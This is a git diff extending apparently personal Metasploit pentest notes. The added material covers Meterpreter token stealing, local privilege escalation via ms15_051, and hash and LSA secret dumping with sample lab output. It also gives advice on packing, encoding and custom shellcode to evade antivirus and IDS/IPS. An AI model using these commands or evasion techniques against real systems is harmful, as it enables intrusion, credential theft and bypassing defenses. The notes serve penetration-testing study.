@@ -95,7 +95,6 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.1
 
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders # for the exploit
 ```
-
 ###  Databases
 ```bash
 # setup db
@@ -105,6 +104,7 @@ sudo msfdb status # check the db status
 sudo msfdb run 
 
 # have problem in msfdb init ? , port 5432 failed: Connection refused 
+sudo msfdb reinit
 sudo nano /etc/postgresql/17/main/postgresql.conf  # check the port to 5432
 sudo msfdb run
 msf6 > connect 127.0.0.1 5432
@@ -134,3 +134,94 @@ db_nmap -sV -sS 10.10.10.8 # nmap scan inside msfconsole
 b_import nmap_scan.xml # import nmap scan
 db_export -f xml backup.xml # export db
 ```
+
+### Plugins
+```bash
+# /usr/share/metasploit-framework/plugins
+load nessus
+nessus_help
+
+# install and add new plugin
+git clone https://github.com/darkoperator/Metasploit-Plugins
+sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
+msfconsole -q
+load pentest
+```
+
+### Sessions
+```bash
+meterpreter > background or [CTRL] + [Z] 
+sessions # view sessions
+sessions -i 1
+```
+### Jobs
+```bash
+exploit -j # run exploit as backgroud job
+jobs -l # list all running jobs
+jobs -k <id>
+```
+
+### Meterpreter
+```bash
+meterpreter > getuid #  [-] 1055: Operation failed: Access is denied.
+meterpreter > ps 
+#  1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+meterpreter > steal_token 1836 # Stolen token with username: NT AUTHORITY\NETWORK SERVICE
+meterpreter > getuid # NT AUTHORITY\NETWORK SERVICE
+background
+
+# priv esc 
+use multi/recon/local_exploit_suggester
+set SESSION 1 
+run # [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+use exploit/windows/local/ms15_051_client_copy_images
+set session 1
+set LHOST tun0
+run
+getuid # NT AUTHORITY\SYSTEM
+
+hashdump # Dumping Hashes
+#Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
+lsa_dump_sam 
+# User : Administrator
+#  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
+#  Hash NTLM: d6908f022af0373e9e21b8a241c86dca
+lsa_dump_secrets
+# Secret  : aspnet_WP_PASSWORD
+# cur/text: Q5C'181g16D'=F
+```
+
+### Writing and Importing Modules
+```bash
+cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+msfconsole -m /usr/share/metasploit-framework/modules/
+msf6> loadpath /usr/share/metasploit-framework/modules/
+msf6 > reload_all # alternative to load  modules
+```
+If you would like to learn more about porting scripts into the Metasploit Framework, check out the [Metasploit: A Penetration Tester's Guide book from No Starch Press](https://nostarch.com/metasploit). Rapid7 has also created blog posts on this topic, which can be found [here](https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/).
+### Introduction to MSFVenom
+check here => [[msfvenom]]
+
+
+### Firewall and IDS/IPS Evasion Techniques
+
+Firewalls and IDS/IPS are designed to detect or block *malicious traffic*, payloads, and known patterns like *NOP sleds* or *common shellcode*. If your exploit gets detected, you might lose your only chance to succeed during an engagement. Always *test in a sandbox* before using the payload on a live target.
+
+Endpoint vs. Perimeter Protection:
+*Endpoint protection* is security software on individual machines like PCs or servers. It usually includes antivirus, antimalware, local firewalls, and anti-DDoS features. Examples: Avast, BitDefender, Malwarebytes.
+
+*Perimeter protection* exists at the network’s edge, managing traffic between the internal and external network (internet). Firewalls and IDS/IPS operate here. Public-facing services are usually placed in a *DMZ (De-Militarized Zone)* — an intermediate layer between the internet and internal network.
+
+Packers:
+*Packers* are used to compress and obfuscate payloads. They bundle your backdoor + decompression stub into a single executable. When run, it decompresses itself and executes the payload. This helps to *evade antivirus detection* by modifying the file structure and behavior. Tools like *msfvenom* allow you to pack and encode payloads.
+
+BoF and NOP Sleds:
+A *Buffer Overflow (BoF)* occurs when input overflows memory space and hijacks program execution. Shellcode is injected to get control. A *NOP sled* (sequence of \x90 instructions) is often used to guide execution into the shellcode safely.
+
+However, large NOP sleds are *easily detected* by IDS/IPS. Instead, consider using *custom encoders*, *polymorphic shellcode*, or *NOP-less techniques*.
+
+Best Practices:
+- Avoid default shellcode or common exploit patterns.
+- Use encoding/packing techniques to obfuscate the payload.
+- Always test your payload in a *safe environment (sandbox)*.
+- Write *custom shellcode* or modify existing ones to bypass signature-based detection.
